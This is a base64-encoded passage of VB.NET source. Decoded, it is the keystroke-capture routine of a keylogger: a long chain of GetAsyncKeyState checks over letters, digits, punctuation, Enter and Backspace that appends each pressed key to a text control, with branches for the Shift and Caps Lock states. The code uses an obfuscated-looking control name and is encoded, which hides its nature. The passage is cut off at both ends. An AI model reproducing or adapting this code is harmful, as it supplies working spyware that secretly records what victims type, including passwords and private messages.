WzU0XS5UZXh0ICsgIkYiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3MSkg PSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiRyIN CiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDcyKSA9IC0zMjc2NyBUaGVuDQog ICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJIIg0KICAgICAgICAgICAgRWxz ZUlmIEdldEFzeW5jS2V5U3RhdGUoNzMpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1 NF0uVGV4dCA9WzU0XS5UZXh0ICsgIkkiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlT dGF0ZSg3NCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRl eHQgKyAiSiINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDc1KSA9IC0zMjc2 NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJLIg0KICAgICAg ICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNzYpID0gLTMyNzY3IFRoZW4NCiAgICAgICAg ICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIkwiDQogICAgICAgICAgICBFbHNlSWYgR2V0 QXN5bmNLZXlTdGF0ZSg3NykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0 ID1bNTRdLlRleHQgKyAiTSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDc4 KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJO Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNzkpID0gLTMyNzY3IFRoZW4N CiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIk8iDQogICAgICAgICAgICBF bHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg4MCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAg WzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiUCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tl eVN0YXRlKDgxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0u VGV4dCArICJRIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODIpID0gLTMy NzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIlIiDQogICAg ICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg4MykgPSAtMzI3NjcgVGhlbg0KICAgICAg ICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiUyINCiAgICAgICAgICAgIEVsc2VJZiBH ZXRBc3luY0tleVN0YXRlKDg0KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRl eHQgPVs1NF0uVGV4dCArICJUIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUo ODUpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsg IlUiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg4NikgPSAtMzI3NjcgVGhl bg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiViINCiAgICAgICAgICAg IEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDg3KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAg ICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJXIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5j S2V5U3RhdGUoODgpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0 XS5UZXh0ICsgIlgiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg4OSkgPSAt MzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiWSINCiAg ICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDkwKSA9IC0zMjc2NyBUaGVuDQogICAg ICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJaIg0KICAgICAgICAgICAgRWxzZUlm IEdldEFzeW5jS2V5U3RhdGUoMzIpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0u VGV4dCA9WzU0XS5UZXh0ICsgIiAiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0 ZSgxMykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQg KyB2Yk5ld0xpbmUNCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDgpID0gLTMy NzY3IFRoZW4NCiAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKHZiTmV3 TGluZSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRo KCJ+IikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRz V2l0aCgiKSIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0 XS5UZXh0LlN1YnN0cmluZygwLFs1NF0uVGV4dC5MZW5ndGggLSAxKQ0KICAgICAgICAgICAgICAg ICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAg ICAgIEVuZCBJZg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNDkpID0gLTMy NzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIiEiDQogICAg ICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg1MCkgPSAtMzI3NjcgVGhlbg0KICAgICAg ICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiQCINCiAgICAgICAgICAgIEVsc2VJZiBH ZXRBc3luY0tleVN0YXRlKDUxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRl eHQgPVs1NF0uVGV4dCArICIjIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUo NTIpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsg IiQiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg1MykgPSAtMzI3NjcgVGhl bg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiJSINCiAgICAgICAgICAg IEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDU0KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAg ICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJeIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5j S2V5U3RhdGUoNTUpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0 XS5UZXh0ICsgIiYiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg1NikgPSAt MzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiKiINCiAg ICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDU3KSA9IC0zMjc2NyBUaGVuDQogICAg ICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICIoIg0KICAgICAgICAgICAgRWxzZUlm IEdldEFzeW5jS2V5U3RhdGUoNDgpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0u VGV4dCA9WzU0XS5UZXh0ICsgIikiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0 ZSgyMjIpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0 ICsgIiIiIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoMTg5KSA9IC0zMjc2 NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJfIg0KICAgICAg ICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoMTg4KSA9IC0zMjc2NyBUaGVuDQogICAgICAg ICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICI8Ig0KICAgICAgICAgICAgRWxzZUlmIEdl dEFzeW5jS2V5U3RhdGUoMTkwKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRl eHQgPVs1NF0uVGV4dCArICI+Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUo MTkxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCAr ICI/Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoMjE5KSA9IC0zMjc2NyBU aGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJ7Ig0KICAgICAgICAg ICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoMjIxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAg ICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJ9Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFz eW5jS2V5U3RhdGUoMTg2KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQg PVs1NF0uVGV4dCArICI6Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoMTg3 KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICIr Ig0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIEVsc2VJZiBNeS5Db21wdXRlci5LZXlib2Fy ZC5TaGlmdEtleURvd24gPSBGYWxzZSBBbmQgTXkuQ29tcHV0ZXIuS2V5Ym9hcmQuQ2Fwc0xvY2sg PSBGYWxzZSBUaGVuDQogICAgICAgICAgICBJZiBHZXRBc3luY0tleVN0YXRlKDY1KSA9IC0zMjc2 NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJhIg0KICAgICAg ICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNjYpID0gLTMyNzY3IFRoZW4NCiAgICAgICAg ICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgImIiDQogICAgICAgICAgICBFbHNlSWYgR2V0 QXN5bmNLZXlTdGF0ZSg2NykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0 ID1bNTRdLlRleHQgKyAiYyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDY4 KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJk Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNjkpID0gLTMyNzY3IFRoZW4N CiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgImUiDQogICAgICAgICAgICBF bHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3MCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAg WzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiZiINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tl eVN0YXRlKDcxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0u VGV4dCArICJnIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNzIpID0gLTMy NzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgImgiDQogICAg ICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3MykgPSAtMzI3NjcgVGhlbg0KICAgICAg ICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiaSINCiAgICAgICAgICAgIEVsc2VJZiBH ZXRBc3luY0tleVN0YXRlKDc0KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRl eHQgPVs1NF0uVGV4dCArICJqIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUo NzUpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsg ImsiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3NikgPSAtMzI3NjcgVGhl bg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAibCINCiAgICAgICAgICAg IEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDc3KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAg ICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJtIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5j S2V5U3RhdGUoNzgpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0 XS5UZXh0ICsgIm4iDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3OSkgPSAt MzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAibyINCiAg ICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDgwKSA9IC0zMjc2NyBUaGVuDQogICAg ICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJwIg0KICAgICAgICAgICAgRWxzZUlm IEdldEFzeW5jS2V5U3RhdGUoODEpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0u VGV4dCA9WzU0XS5UZXh0ICsgInEiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0 ZSg4MikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQg KyAiciINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDgzKSA9IC0zMjc2NyBU aGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJzIg0KICAgICAgICAg ICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODQpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAg ICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgInQiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5 bmNLZXlTdGF0ZSg4NSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1b NTRdLlRleHQgKyAidSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDg2KSA9 IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJ2Ig0K ICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODcpID0gLTMyNzY3IFRoZW4NCiAg ICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgInciDQogICAgICAgICAgICBFbHNl SWYgR2V0QXN5bmNLZXlTdGF0ZSg4OCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQgKyAieCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0 YXRlKDg5KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4 dCArICJ5Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoOTApID0gLTMyNzY3 IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgInoiDQogICAgICAg ICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSgzMikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAg ICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiICINCiAgICAgICAgICAgIEVsc2VJZiBHZXRB c3luY0tleVN0YXRlKDEzKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQg PVs1NF0uVGV4dCArIHZiTmV3TGluZQ0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3Rh dGUoOCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5k c1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRl eHQuRW5kc1dpdGgoIn4iKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0 XS5UZXh0LkVuZHNXaXRoKCIpIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQuU3Vic3RyaW5nKDAsWzU0XS5UZXh0Lkxlbmd0aCAtIDEpDQogICAg ICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQog ICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0 ZSg0OSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQg KyAiMSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDUwKSA9IC0zMjc2NyBU aGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICIyIg0KICAgICAgICAg ICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTEpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAg ICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjMiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5 bmNLZXlTdGF0ZSg1MikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1b NTRdLlRleHQgKyAiNCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDUzKSA9 IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICI1Ig0K ICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTQpID0gLTMyNzY3IFRoZW4NCiAg ICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjYiDQogICAgICAgICAgICBFbHNl SWYgR2V0QXN5bmNLZXlTdGF0ZSg1NSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQgKyAiNyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0 YXRlKDU2KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4 dCArICI4Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNTcpID0gLTMyNzY3 IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIjkiDQogICAgICAg ICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg0OCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAg ICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiMCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRB c3luY0tleVN0YXRlKDIyMikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0 ID1bNTRdLlRleHQgKyAiJyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE4 OSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAi LSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE4OCkgPSAtMzI3NjcgVGhl bg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiLCINCiAgICAgICAgICAg IEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDE5MCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAg ICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiLiINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3lu Y0tleVN0YXRlKDE5MSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1b NTRdLlRleHQgKyAiLyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDIxOSkg PSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiWyIN CiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDIyMSkgPSAtMzI3NjcgVGhlbg0K ICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiXSINCiAgICAgICAgICAgIEVs c2VJZiBHZXRBc3luY0tleVN0YXRlKDE4NikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAg WzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiOyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tl eVN0YXRlKDE4NykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRd LlRleHQgKyAiPSINCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbHNlSWYgTXkuQ29tcHV0 ZXIuS2V5Ym9hcmQuU2hpZnRLZXlEb3duID0gRmFsc2UgQW5kIE15LkNvbXB1dGVyLktleWJvYXJk LkNhcHNMb2NrID0gVHJ1ZSBUaGVuDQogICAgICAgICAgICBJZiBHZXRBc3luY0tleVN0YXRlKDY1 KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJB Ig0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNjYpID0gLTMyNzY3IFRoZW4N CiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIkIiDQogICAgICAgICAgICBF bHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg2NykgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAg WzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiQyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tl eVN0YXRlKDY4KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0u VGV4dCArICJEIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoNjkpID0gLTMy NzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIkUiDQogICAg ICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3MCkgPSAtMzI3NjcgVGhlbg0KICAgICAg ICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiRiINCiAgICAgICAgICAgIEVsc2VJZiBH ZXRBc3luY0tleVN0YXRlKDcxKSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRl eHQgPVs1NF0uVGV4dCArICJHIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUo NzIpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsg IkgiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3MykgPSAtMzI3NjcgVGhl bg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiSSINCiAgICAgICAgICAg IEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDc0KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAg ICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJKIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5j S2V5U3RhdGUoNzUpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0 XS5UZXh0ICsgIksiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg3NikgPSAt MzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiTCINCiAg ICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDc3KSA9IC0zMjc2NyBUaGVuDQogICAg ICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJNIg0KICAgICAgICAgICAgRWxzZUlm IEdldEFzeW5jS2V5U3RhdGUoNzgpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0u VGV4dCA9WzU0XS5UZXh0ICsgIk4iDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0 ZSg3OSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQg KyAiTyINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDgwKSA9IC0zMjc2NyBU aGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJQIg0KICAgICAgICAg ICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODEpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAg ICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIlEiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5 bmNLZXlTdGF0ZSg4MikgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1b NTRdLlRleHQgKyAiUiINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDgzKSA9 IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJTIg0K ICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODQpID0gLTMyNzY3IFRoZW4NCiAg ICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIlQiDQogICAgICAgICAgICBFbHNl SWYgR2V0QXN5bmNLZXlTdGF0ZSg4NSkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAgICAgICAgWzU0 XS5UZXh0ID1bNTRdLlRleHQgKyAiVSINCiAgICAgICAgICAgIEVsc2VJZiBHZXRBc3luY0tleVN0 YXRlKDg2KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQgPVs1NF0uVGV4 dCArICJWIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoODcpID0gLTMyNzY3 IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIlciDQogICAgICAg ICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg4OCkgPSAtMzI3NjcgVGhlbg0KICAgICAgICAg ICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiWCINCiAgICAgICAgICAgIEVsc2VJZiBHZXRB c3luY0tleVN0YXRlKDg5KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRdLlRleHQg PVs1NF0uVGV4dCArICJZIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3RhdGUoOTAp ID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0ICsgIloi 